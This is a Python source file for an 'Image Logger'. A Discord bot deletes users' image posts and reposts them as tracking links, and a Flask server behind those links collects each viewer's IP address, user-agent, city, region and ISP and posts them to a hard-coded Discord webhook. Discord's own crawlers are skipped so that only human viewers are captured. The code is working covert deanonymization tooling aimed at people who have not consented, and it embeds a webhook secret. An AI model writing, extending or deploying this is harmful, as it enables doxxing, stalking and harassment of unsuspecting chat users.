"""
Image Logger — Discord Webhook Pinger + Bot (combined)
language: Python 3.11+, file: server.py, target: Railway
"""

import os
import uuid
import threading
import requests
import discord
from datetime import datetime, timezone
from flask import Flask, request, redirect, Response, jsonify
from discord.ext import commands

app = Flask(__name__)

WEBHOOK_URL   = "https://discord.com/api/webhooks/1553477510765744209/hBUBKS7Nl3xMMDmRCkZRqnEHN2tJm229z32HQgh0w5XSOW36aWJ94iE4MtknLh6Fr2tm"
DISCORD_TOKEN = os.environ.get("DISCORD_TOKEN", "")
LOGGER_HOST   = os.environ.get("LOGGER_HOST", "http://localhost:5000")

image_store: dict[str, str] = {}
seen_ips: set[str] = set()

def geoip(ip: str) -> dict:
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,org,query", timeout=4)
        if r.ok:
            return r.json()
    except Exception:
        pass
    return {}

def fire_webhook(tracking_id: str, img_url: str, ip: str, geo: dict, ua: str):
    now      = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
    country  = geo.get("country", "Unknown")
    region   = geo.get("regionName", "")
    city     = geo.get("city", "")
    isp      = geo.get("isp", "Unknown")
    location = f"{city}, {region}, {country}".strip(", ")
    embed = {
        "title": "📸 Image Clicked",
        "color": 0xFF4444,
        "fields": [
            {"name": "🔗 Tracking ID", "value": f"`{tracking_id}`", "inline": True},
            {"name": "🕐 Time",         "value": now,               "inline": True},
            {"name": "🌐 IP Address",   "value": f"`{ip}`",         "inline": False},
            {"name": "🗺️ Location",     "value": location or "N/A", "inline": True},
            {"name": "📡 ISP",          "value": isp,               "inline": True},
            {"name": "🖥️ User-Agent",   "value": f"```{ua[:200]}```","inline": False},
        ],
        "thumbnail": {"url": img_url},
        "footer":    {"text": "Image Logger"},
    }
    try:
        requests.post(WEBHOOK_URL, json={"embeds": [embed]}, timeout=5)
    except Exception as e:
        print(f"[webhook error] {e}")

@app.route("/register")
def register():
    img_url = request.args.get("img")
    host    = request.args.get("host", LOGGER_HOST)
    if not img_url:
        return jsonify({"error": "missing ?img= param"}), 400
    tid = uuid.uuid4().hex[:10]
    image_store[tid] = img_url
    tracking_url = f"{host}/img/{tid}"
    return jsonify({"tracking_url": tracking_url, "original": img_url})

@app.route("/img/<tid>")
def serve_image(tid: str):
    img_url = image_store.get(tid)
    if not img_url:
        return "not found", 404
    ip = request.headers.get("X-Forwarded-For", request.remote_addr).split(",")[0].strip()
    ua = request.headers.get("User-Agent", "")
    skip_agents = ("Discordbot", "DiscordMediaProxy")
    if any(s in ua for s in skip_agents):
        return redirect(img_url, code=302)
    if ip not in seen_ips:
        seen_ips.add(ip)
        geo = geoip(ip)
        fire_webhook(tid, img_url, ip, geo, ua)
    try:
        r = requests.get(img_url, timeout=8, stream=True)
        return Response(r.content, content_type=r.headers.get("Content-Type", "image/jpeg"))
    except Exception:
        return redirect(img_url, code=302)

@app.route("/list")
def list_trackers():
    return jsonify(image_store)

IMAGE_TYPES = {"image/png", "image/jpeg", "image/gif", "image/webp"}
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"[*] Bot logged in as {bot.user}")

@bot.event
async def on_message(message: discord.Message):
    if message.author.bot:
        return
    for attachment in message.attachments:
        ct = attachment.content_type or ""
        if not any(ct.startswith(t) for t in IMAGE_TYPES):
            continue
        try:
            r = requests.get(
                f"{LOGGER_HOST}/register",
                params={"img": attachment.url, "host": LOGGER_HOST},
                timeout=6,
            )
            tracking_url = r.json().get("tracking_url") if r.ok else None
        except Exception as e:
            print(f"[bot register error] {e}")
            tracking_url = None
        if not tracking_url:
            continue
        try:
            await message.delete()
        except discord.Forbidden:
            pass
        await message.channel.send(tracking_url)
    await bot.process_commands(message)

def run_bot():
    if DISCORD_TOKEN:
        print("[*] Starting Discord bot...")
        bot.run(DISCORD_TOKEN)
    else:
        print("[!] No DISCORD_TOKEN set — bot disabled")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    print(f"[*] Image logger running on port {port}")
    t = threading.Thread(target=run_bot, daemon=True)
    t.start()
    app.run(host="0.0.0.0", port=port, debug=False)
